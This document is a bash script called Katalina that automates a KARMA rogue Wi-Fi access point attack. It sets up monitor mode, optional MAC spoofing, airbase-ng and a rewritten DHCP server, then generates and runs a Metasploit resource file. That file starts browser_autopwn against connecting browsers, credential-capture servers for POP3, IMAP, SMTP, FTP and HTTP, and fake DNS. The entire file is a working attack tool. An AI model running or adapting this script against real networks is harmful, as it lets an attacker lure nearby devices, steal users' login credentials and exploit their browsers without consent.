#!/bin/bash
# This is Katalina - A KARMA Attack automation script
# So far it only works standalone with Metasploit
# Future versions will be able to choose between
# aircrack-ng suite or Jasager as the KARMA platform

#History:
#0.6 - a) jab added multiple new supplemental parameters!
#0.5 - a) Sweet, Sweet, colors! No color coordination, what-so-ever!
#0.4 - a) Added support for re-initializing the wireless driver. Some VMs seem to require this.
#      b) Also, added error checking when enabling monitor mode.
#0.3 - a) Added support for tailing /var/log/messages
#0.2 - a) I think it works now
#0.1 - a) Initial version
version="0.6"
release_date="20120205"

#Default Parameters - Don't change them here, read the help!
dhcpd_rewrite=false
default_ap="FON_AP"
msg_verbose=false
wlan_reinit=false

# jab added - set channel, set LAN, screen -L to log metasploit, macchanger -A, and workspace -a karma
chan_cmd=""
class_C_ip="10.0.0"
workspace_cmd=""
log_msf_cmd=""
change_mac=false


function banner {

echo -e "\033[0;35m               _          _  _               "
echo -e "\033[0;35m   /\ /\ __ _ | |_  __ _ | |(_) _ __    __ _ "
echo -e "\033[0;35m  / //_// _\` || __|/ _\` || || || '_ \  / _\` |"
echo -e "\033[0;35m / __ \| (_| || |_| (_| || || || | | || (_| |"
echo -e "\033[0;35m \/  \/ \__,_| \__|\__,_||_||_||_| |_| \__,_|"
echo -e "     \033[0;31mVersion:\033[0;32m $version\033[0m \033[0;31mRelease: \033[0;32m$release_date\033[0m                       "  
echo -e "﻿       \033[0;30m/KARMA comes back around/\033[0m"
echo
}

function err () {
echo "[$0] ERROR: $1"
exit 1
}

function check_deps {
#Auto-locate dependencies - If for any reason this doesn't work set them here manually
sed=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'sed'))
grep=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'grep'))
awk=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'awk'))
airmonng=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'airmon-ng'))
dhcpd3=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'dhcpd3'))
msfconsole=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'msfconsole'))
airbaseng=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'airbase-ng'))
[ $change_mac == "true" ] && macchanger=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'macchanger'))

[ $sed ] || err "sed doesn't exist!"
[ $grep ] || err "grep doesn't exist!"
[ $awk ] || err "awk doesn't exist!"
[ $airmonng ] || err "airmon-ng doesn't exist! Run, 'apt-get install aircrack-ng'"
[ $dhcpd3 ] || err "dhcpd3 doesn't exist! Run, 'apt-get install dhcp3-server'"
[ $msfconsole ] || err "msfconsole doesn't exist! Is this even BackTrack?!'"
[ $airbaseng ] || err "airbase-ng doesn't exist! Run, 'apt-get install aircrack-ng'"
[ $change_mac != "true" ] || [ $macchanger ] || err "macchanger doesn't exist! Run, 'apt-get install macchanger', or don't use \"-M\" option"
}

function enable_mon {
﻿  if=($(iwconfig 2> /dev/null | $grep "802.11" | $awk -F" " '{ printf "%s ",$1 }'))
﻿  [ $if ] || err "No 802.11 interfaces available."

﻿  echo -e "Available 802.11 Interfaces:\n"
﻿  c=1; for i in ${if[*]};do echo -e "\033[0;33m\t$c.\033[0m $i";c=$((c + 1 )); done

﻿  echo -n "Choose interface: ";read -n1 ifn;echo 
﻿  w=${if[$(($ifn - 1))]}

﻿  #Identify the Wireless driver. Re-initialize if requested.
        d=$($airmonng | $grep $w | $awk -F " " '{ print $4 }')
﻿  echo "Wireless driver for $w is: $d"
﻿  if [ $wlan_reinit == "true" ]; then
﻿  ﻿  echo "Re-initializing $d..."
﻿  ﻿  rmmod $d
﻿  ﻿  rfkill block all
﻿  ﻿  rfkill unblock all
﻿  ﻿  modprobe $d
﻿  ﻿  rfkill unblock all
﻿  ﻿  ifconfig $w up
﻿  fi


﻿  # Change $w MAC address
﻿  if [ $change_mac == "true" ]; then
﻿  ﻿  ORG_MAC=`$macchanger -s $w | cut -d' ' -f3`
﻿  ﻿  ifconfig $w down
﻿  ﻿  $macchanger -A $w
﻿  ﻿  ifconfig $w up
﻿  ﻿  sleep 5
﻿  ﻿  MAC=`$macchanger -s $w | cut -d' ' -f3`
﻿  ﻿  echo Original MAC is $ORG_MAC
﻿  ﻿  echo new MAC is $MAC
﻿  fi

﻿  echo -e "\nSetting $w in monitor mode..."
﻿  err132=$(airmon-ng start $w 2>&1);m=$($airmonng | $grep "mon" | $awk -F " " '{ print $1 }')
﻿  if [ "$(echo $err132 | $grep "SIOCSIFFLAGS: Unknown error")" ]; then

 ﻿  ﻿  $airmonng stop $m > /dev/null
﻿  ﻿  err "Could not enable monitor mode on $w. Try again with the -R parameter."
﻿  else
﻿  ﻿  echo "New monitor interface: $m"
﻿  fi

﻿  # Change $m MAC address
﻿  if [ $change_mac == "true" ]; then
﻿  ﻿  ifconfig $m down
﻿  ﻿  $macchanger -m $MAC $m
﻿  ﻿  ifconfig $m up
﻿  fi
}

function wait_n_exit {
﻿  quit="no";while [ "$quit" != "quit" ]; do echo -n "The attack is active on the new x-terms. Type 'quit' to exit: ";read quit;done
﻿  
﻿  echo -e "\n\n[x] Killing off airbase-ng..."
﻿  killall -9 airbase-ng &> /dev/null

﻿  echo "[x] Disabling $m and cleaning up..."
﻿  $airmonng stop $m > /dev/null
﻿  
﻿  if [ $change_mac == "true" ]; then
﻿  ﻿  echo "[x] Restoring original $w MAC address..."
﻿  ﻿  ifconfig $w down
﻿  ﻿  $macchanger -m $ORG_MAC $w
﻿  ﻿  ifconfig $w up
﻿  fi

﻿  echo "[x] Killing dhcpd3..."
﻿  killall -9 dhcpd3 &> /dev/null
﻿  
﻿  rm -f katalina_msf3.rc
﻿  exit
}

function showhelp {

﻿  echo -e "MAIN PARAMETERS:\n\t-D: Re-write '/etc/dhcp3/dhcpd.conf' file\n\t-a <ap_name>: Specify Access Point name (default is 'FON_AP')\n\t-v: Tail /var/log/messages\n\t-h: This help!\n\nSUPPORT PARAMETERS:\n\t-R: Re-initialize wireless driver. (Useful for VMs)\n\t-c <channel>: Change the channel\n\t-l <x.x.x>: Change the \"class c\" LAN from its initial value of 10.0.0\n\t-W: Change the Metasploit workspace to karma\n\t-L: Log MSF output to screenlog.0\n\t-M: Change MAC to random but valid value." 
}


function enable_dhcpd {
[ -f '/etc/dhcp3/dhcpd.conf' ] || dhcpd_rewrite=true
if [ $dhcpd_rewrite == 'true' ]; then
﻿  echo "Writing '/etc/dhcp3/dhcpd.conf'"
﻿  [ -f '/etc/dhcp3/dhcpd.conf' ] && mv /etc/dhcp3/dhcpd.conf /etc/dhcp3/dhcpd.conf.katalinabackup-$(date +%Y%m%d-%H%M)
﻿  echo -e "option domain-name-servers ${class_C_ip}.1;\ndefault-lease-time 60;\nmax-lease-time 72;\nddns-update-style none;\nauthoritative;\nlog-facility local7;\nsubnet ${class_C_ip}.0 netmask 255.255.255.0 {\n  range ${class_C_ip}.100 ${class_C_ip}.254;\n  option routers ${class_C_ip}.1;\n  option domain-name-servers ${class_C_ip}.1;\n}" > /etc/dhcp3/dhcpd.conf﻿  
else 
﻿  echo "Leaving '/etc/dhcp3/dhcpd.conf' untouched... Make sure it has a valid configuration. Use the '-D' flag to overwrite with a valid conf."
fi

$dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0 2> /dev/null &
}

function launch_msf3 {
echo -e "${workspace_cmd}\n\nuse auxiliary/server/browser_autopwn\n\nsetg AUTOPWN_HOST ${class_C_ip}.1\nsetg AUTOPWN_PORT 55550\nsetg AUTOPWN_URI /ads\n\nset LHOST ${class_C_ip}.1\nset LPORT 45000\nset SRVPORT 55550\nset URIPATH /ads\n\nrun\n\n\nuse auxiliary/server/capture/pop3\nset SRVPORT 110\nset SSL false\nrun\n\nuse auxiliary/server/capture/pop3\nset SRVPORT 995\nset SSL true\nrun\n\nuse auxiliary/server/capture/ftp\nrun\n\nuse auxiliary/server/capture/imap\nset SSL false\nset SRVPORT 143\nrun\n\nuse auxiliary/server/capture/imap\nset SSL true\nset SRVPORT 993\nrun\n\nuse auxiliary/server/capture/smtp\nset SSL false\nset SRVPORT 25\nrun\n\nuse auxiliary/server/capture/smtp\nset SSL true\nset SRVPORT 465\nrun\n\nuse auxiliary/server/fakedns\nunset TARGETHOST\nset SRVPORT 5353\nrun\n\nuse auxiliary/server/fakedns\nunset TARGETHOST\nset SRVPORT 53\nrun\n\nuse auxiliary/server/capture/http\nset SRVPORT 80\nset SSL false\nrun\n\nuse auxiliary/server/capture/http\nset SRVPORT 8080\nset SSL false\nrun\n\nuse auxiliary/server/capture/http\nset SRVPORT 443\nset SSL true\nrun\n\nuse auxiliary/server/capture/http\nset SRVPORT 8443\nset SSL true\nrun" > katalina_msf3.rc

xterm -e "${log_msf_cmd} $msfconsole -r katalina_msf3.rc" &
#xterm -e $msfconsole -r katalina_msf3.rc &
}

function enable_airbase {

﻿  xterm -e "airbase-ng ${chan_cmd} -P -C 30 -e \"$default_ap\" -v $m" &
#﻿  xterm -e $airbaseng -P -C 30 -e $default_ap -v $m &
﻿  sleep 5
﻿  ifconfig at0 up ${class_C_ip}.1 netmask 255.255.255.0 &

}

function msg_verbose {
if [ $msg_verbose == 'true' ]; then
﻿  xterm -e tail -f /var/log/messages &
fi
}
#-------FUNCTIONS END------------
banner

#Show me teh optionz f00l!
while getopts ":Da:hvRc:l:WLM" optname; do
﻿  case "$optname" in
﻿  "D")
﻿      dhcpd_rewrite=true
﻿      ;;
﻿  "R")
﻿  wlan_reinit=true
echo "wlan_reinit=true"
        ;;

﻿  "v")
        msg_verbose=true
echo "msg_verbose=true"
        ;;
﻿  "a")
﻿      echo "Setting Rogue AP to: $OPTARG"; default_ap=$OPTARG
﻿      ;;

﻿  "c")
﻿      echo "Setting Channel to: $OPTARG"; chan_cmd="-c $OPTARG"
            ;;
﻿  "l")
﻿      echo "Setting LAN to: $OPTARG"; class_C_ip="$OPTARG"
            ;;
﻿  "W")
            ws=${OPTARG:-"karma"}
﻿      echo "Setting MSF workspace to: $ws"; workspace_cmd="workspace -a $ws"
            ;;
﻿  "L")
﻿      echo "Logging MSF output to screenlog.0"; log_msf_cmd="screen -L"
           ;;
﻿  "M")
﻿      echo "Changing MAC to random valid value."; change_mac=true
           ;;

﻿  "h")
﻿     showhelp;exit 0
﻿     ;;
﻿  "?")
﻿     err "Unknown option: '$OPTARG'"
﻿     ;;
﻿  ":")
﻿     err "No argument for option: '$OPTARG'"
           ;;
﻿  *)
﻿     err "Unkown error while processing options"
﻿     ;;
﻿  esac
done

#Step 0 - Check dependencies
check_deps

#Step 1 - Idetify wlan interface and enable monitor mode...
enable_mon

#Step 2 - Enable Airbase-NG...
enable_airbase

#Step 3 - Enable DHCPd and re-create the right KARMA config if required...
enable_dhcpd 

#Step 4 - Launch Metasploit
launch_msf3

#Step 5- Check Verbose flag
msg_verbose

#Step Z - Clean up and exit
wait_n_exit

